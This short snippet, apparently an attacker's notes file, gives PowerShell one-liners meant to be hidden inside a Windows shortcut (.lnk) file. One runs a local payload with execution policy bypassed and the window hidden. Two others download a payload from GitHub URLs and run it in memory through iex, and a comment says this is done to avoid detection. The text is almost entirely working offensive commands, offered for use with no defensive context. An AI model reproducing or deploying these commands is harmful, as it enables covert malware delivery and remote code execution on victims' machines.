
# you can hide one of these cmd in a lnk windows file
powershell.exe -executionpolicy bypass -noprofile -windowstyle hidden "gc .\payload.txt | iex"
# for remote execution
# the file is downloaded and executed in memory to avoid detection 
# powershell.exe -executionpolicy bypass -noprofile -windowstyle hidden "(New-Object System.Net.WebClient).DownloadString('https://gist.github.com/H0neyBadger/0b664520e7aa71a37fcd14238f9603cb/raw/payload.txt') | iex"
# powershell.exe -executionpolicy bypass -noprofile -windowstyle hidden "(New-Object System.Net.WebClient).DownloadString('https://raw.githubusercontent.com/H0neyBadger/H0ney/master/payload.txt') | iex"

